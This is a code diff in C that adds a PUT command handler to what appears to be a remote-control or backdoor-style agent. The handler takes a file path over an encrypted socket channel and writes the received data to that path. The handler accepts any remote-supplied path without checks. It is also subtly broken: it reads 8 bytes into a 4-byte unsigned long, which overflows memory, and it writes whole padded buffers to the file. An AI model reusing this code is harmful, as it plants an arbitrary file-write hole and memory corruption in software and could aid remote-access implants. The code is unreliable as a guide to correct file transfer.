@@ -181,5 +181,50 @@ BOOL impl_GET(IN SOCKET *s, IN const char *params)
 
 BOOL impl_PUT(IN SOCKET *s, IN const char *params)
 {
+    FILE            *fp = NULL;
+    char            res[BUF_SZ];
+    char            status[BUF_SZ];
+    unsigned long   nwrite;
+
+    while (*params == ' ')
+        params++;
+
+    if (*params == 0)
+        return TRUE;
+
+    RtlZeroMemory(res, sizeof(res));
+    RtlZeroMemory(status, sizeof(status));
+
+    fp = fopen(params, "wb");
+    if (fp == NULL) {
+        strcpy(status, STATUS_ERR);
+        sendbuf(*s, encrypt(status));
+        return TRUE;
+    }
+
+    // if opening file for reading is successful
+    strcpy(status, STATUS_SUCCESS);
+    sendbuf(*s, encrypt(status));
+
+    recvbuf(*s, res);
+    decrypt(res);
+
+    while (strstr(res, STATUS_END) == NULL) {
+        fwrite(res, sizeof(char), sizeof(res), fp);
+        RtlZeroMemory(res, sizeof(res));
+        recvbuf(*s, res);
+        decrypt(res);
+    }
+    RtlZeroMemory(res, sizeof(res));
+
+    recv(*s, (unsigned char *)&nwrite, 8, 0);
+    nwrite = ntohl(nwrite);
+
+    recvbuf(*s, res);
+    decrypt(res);
+    fwrite(res, sizeof(char), nwrite, fp);
+
+    fclose(fp);
+
     return TRUE;
 }
